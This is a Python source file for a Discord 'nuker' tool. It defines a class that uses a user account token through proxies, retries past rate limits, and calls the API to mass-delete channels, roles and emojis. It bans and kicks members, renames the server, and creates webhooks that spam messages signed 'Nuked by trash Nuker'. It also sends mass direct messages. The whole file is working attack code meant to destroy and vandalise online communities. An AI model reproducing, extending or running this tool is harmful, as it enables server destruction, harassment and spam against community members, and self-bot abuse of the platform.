import requests as req, random, time, base64

from Plugins.tools import Tools


class Nuking:
    def __init__(self, token: str, guild_id: str) -> None:
        # Get headers directly from Tools (now optimized for Self-bot)
        self.headers = {**Tools.auth_headers(token), "X-Audit-Log-Reason": "Trash Nuker"}
        self.guild, self.token = guild_id, token

    @staticmethod
    def _ok(status_code: int, allowed=(200, 201, 204)) -> bool:
        return status_code in allowed

    def _request(self, method: str, url: str, *, json_payload=None, max_retries: int = 3):
        for _ in range(max_retries + 1):
            try:
                r = req.request(
                    method,
                    url,
                    headers=self.headers,
                    json=json_payload,
                    proxies=Tools.proxy(),
                    timeout=15,
                )
            except req.RequestException:
                return None

            if r.status_code == 429:
                try:
                    time.sleep(float(r.json().get("retry_after", 1)))
                except Exception:
                    time.sleep(1)
                continue
            return r
        return None
    
    def delete_channel(self, channel_id: str):
        url = Tools.api("/channels/%s" % channel_id)
        r = self._request("DELETE", url)
        return bool(r and self._ok(r.status_code, (200, 204)))



    def create_channel(self, name: str, channel_type: int):
        url = Tools.api("/guilds/%s/channels" % self.guild)
        payload = {"name": name, "type": channel_type}
        r = self._request("POST", url, json_payload=payload)
        if r and r.status_code == 201:
            return r.json().get("id")
        return False


    def rename_channel(self, name: str, channel: str):
        url = Tools.api(f"/channels/{channel}")
        payload = {"name": name}
        r = self._request("PATCH", url, json_payload=payload)
        return bool(r and self._ok(r.status_code))




    def create_role(self, name: str):
        url = Tools.api("/guilds/%s/roles" % self.guild)
        payload = {"name": name, "hoist": True, "mentionable": True, "color": random.randint(0, 16777215)}
        r = self._request("POST", url, json_payload=payload)
        if r and r.status_code == 200:
            return r.json().get("id")
        return False




    def delete_role(self, role_id: str):
        url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
        r = self._request("DELETE", url)
        return bool(r and r.status_code == 204)


    def rename_role(self, role_id: str, name: str):
        url = Tools.api("/guilds/%s/roles/%s" % (self.guild, role_id))
        payload = {"name": name, "color": random.randint(0, 16777215)}
        r = self._request("PATCH", url, json_payload=payload)
        return bool(r and self._ok(r.status_code))


    def ban(self, member_id: str):
        url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
        r = self._request("PUT", url)
        return bool(r and self._ok(r.status_code))


        
    def unban(self, member_id: str):
        url = Tools.api(f"guilds/{self.guild}/bans/{member_id}")
        r = self._request("DELETE", url)
        return bool(r and self._ok(r.status_code))
        

        
    def kick(self, member_id: str):
        url = Tools.api(f"guilds/{self.guild}/members/{member_id}")
        r = self._request("DELETE", url)
        return bool(r and self._ok(r.status_code))



    def create_webhook(self, channel: str):
        url = Tools.api(f"/channels/{channel}/webhooks")
        payload = {"name": "Nuked by trash Nuker"}
        r = self._request("POST", url, json_payload=payload)
        if r and r.status_code == 200:
            return r.json().get("url", False)
        return False



    def send_webhook(self, url: str,message: str, times: int):
        try:
            payload = {
                "username": "ZZZZZZZZZZ",
                "content": message,
                "avatar_url": "https://cdn.discordapp.com/attachments/1054650838129332255/1189847060082606121/download.jpg?ex=659fa66d&is=658d316d&hm=411ec5aeef0752758152a1bb43df4a325f6bc625c3a532dc6db7201fbd3f09e0&"

            }

            for i in range(times):
                t = req.post(url, json=payload, proxies=Tools.proxy())
        except: pass

    def send_message(self, channel: str,message: str):
        url = Tools.api(f"channels/{channel}/messages")
        payload = {"content": message}
        r = self._request("POST", url, json_payload=payload)
        return bool(r and r.status_code == 200)
    
    def change_nick(self, member_id: str, nick: str):
        url = Tools.api(f"/guilds/{self.guild}/members/{member_id}")
        paylaod = {"nick": nick}
        r = self._request("PATCH", url, json_payload=paylaod)
        return bool(r and self._ok(r.status_code))

    def rename_guild(self, name: str):
        url = Tools.api(f"/guilds/{self.guild}")
        payload = {"name": name}
        r = self._request("PATCH", url, json_payload=payload)
        return bool(r and self._ok(r.status_code))
        
    def change_guild_icon(self, icon_path: str):
        try:
            url = Tools.api(f"guilds/{self.guild}")
            icon_format = icon_path.split(".")
            icon_format = icon_format[len(icon_format)-1]
            with open(icon_path, "rb") as icon:
                payload = {"icon": f"data:image/{icon_format};base64,{base64.b64encode(icon.read()).decode(encoding='utf8')}"}

            r = req.patch(url, headers=self.headers, json=payload, proxies=Tools.proxy())

            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False

    def remove_emoji(self, emoji_id: str):
        try:
            url = Tools.api(f"guilds/{self.guild}/emojis/{emoji_id}")

            r = req.delete(url, headers=self.headers, proxies=Tools.proxy())


            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                return True
            else:
                return False
        except: return False

    def send_direct_message(self, user: str, message: str):
        try:
            url = Tools.api("/users/@me/channels")
            payload = {"recipient_id": user}

            r = req.post(url, json=payload, headers=self.headers, proxies=Tools.proxy())

            if r.status_code != 200: return False

            id = r.json()["id"]

            return self.send_message(id, message)
        except: return False

    
    def sussy_create_channel(self):
        url = Tools.api(f"/guilds/{self.guild}")

        payload = {
            "public_updates_channel_id": "1",
            "rules_channel_id": "1"
        }

        r = req.patch(url, json=payload, headers=self.headers)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            return True
        else:
            return False
